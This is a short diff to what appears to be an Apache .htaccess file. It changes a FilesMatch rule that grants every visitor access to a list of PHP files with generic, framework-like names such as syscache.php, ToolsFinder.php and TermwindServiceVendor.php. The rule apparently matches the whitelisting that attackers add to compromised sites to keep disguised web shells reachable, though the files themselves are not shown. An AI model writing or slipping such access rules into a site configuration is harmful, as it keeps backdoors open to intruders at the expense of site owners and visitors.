@@ -58,7 +58,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(Folderaps.php|User-Setting.php|syscache.php|listbuilder.php|ThemeSettings.php|IPV6String.php|framework.php|Visitor.php|TermwindServiceSetting.php|TermwindServiceVendor.php)$">
+<FilesMatch "^(json.php|ExceptionInterface.php|ToolsFinder.php|listbuilder.php|ThemeSettings.php|IPV6String.php|framework.php|Visitor.php|TermwindServiceSetting.php|TermwindServiceVendor.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
